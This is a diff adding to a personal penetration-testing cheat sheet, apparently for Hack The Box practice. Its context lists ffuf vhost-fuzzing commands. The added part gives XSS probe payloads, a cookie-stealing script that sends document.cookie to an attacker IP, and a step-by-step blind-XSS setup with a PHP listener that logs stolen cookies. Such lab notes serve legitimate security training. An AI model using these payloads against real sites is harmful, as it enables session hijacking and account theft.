@@ -167,6 +167,7 @@ pip3 install -r requirements.txt
 | `ffuf -ic -u http://fuzzing_fun.htb:40518 -H "Host: FUZZ.fuzzing_fun.htb" -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 403` | Find other vhosts |
 | `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -ic -u http://hidden.fuzzing_fun.htb:40518/godeep/FUZZ -recursion` | -ic ignores comments in wordlists |
 
+**Takeaways**
 - Filter noise early using -fc, -fw, or -fs
 - 403 files usually mean wrong entry point, not the vuln (HTB trickery)
 - Add new vhosts to etc/hosts and ffuf each one, if there is nothing then your probably in the wrong spot
@@ -175,4 +176,47 @@ pip3 install -r requirements.txt
 
 - Check source code for src=js file. Deobfuscate code if needed at --> https://matthewfl.com/unPacker.html
 - https://gchq.github.io/CyberChef/ and CTRL + SHIFT + J for additional help
+
+## Cross-Site Scripting (XSS)
+
+| Command | Description |
+|--------|------------|
+| `<script>alert(window.origin)</script>`| XSS Payload confirming JS execution|
+| `<script>print(test)</script>` | XSS Payload confirming JS execution WITHOUT ALERTS |
+| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Get Victim's Cookie 
+| `<img src="" onerror=alert(window.origin)>` | Loads invalid image |
+| `<svg onload=alert(1)>` | Exploits svg |
+| `<plaintext> ` | Breaks HTML parsing, tests HTML injection |
+# XSS Assessment
+```bash
+# Start Local Listener
+mkdir /tmp/xss
+cd /tmp/xss
+sudo php -S 0.0.0.0:80  #8000 if 80 doesnt work but change commands to 8000
+```
+**Create Script.js & Index.php file to Steal Cookies (IMPORTANT)**
+```bash
+nano script.js
+# put this in script.js
+new Image().src='http://10.10.14.5:8000/index.php?c='+document.cookie;
+
+nano index.php
+# put this in index.php
+<?php
+if (isset($_GET['c'])) {
+    file_put_contents("cookies.txt", $_GET['c']);
+}
+?>
+
+```
+| Command | Description |
+|--------|------------|
+| `<script src="http://10.10.14.5:8000/FIELDNAME"></script>`| Find vulnerable field |
+| `http://example.com"><script src="http://10.10.14.5:8000/website"></script>` | Example for Website |
+
+**Takeaways**
+- This is for Blind XSS, Reflected/Stored would show already when tested.
+- Explore the site and dont use the first search you see.
+- Check source code and go step by step I just listed
+
 
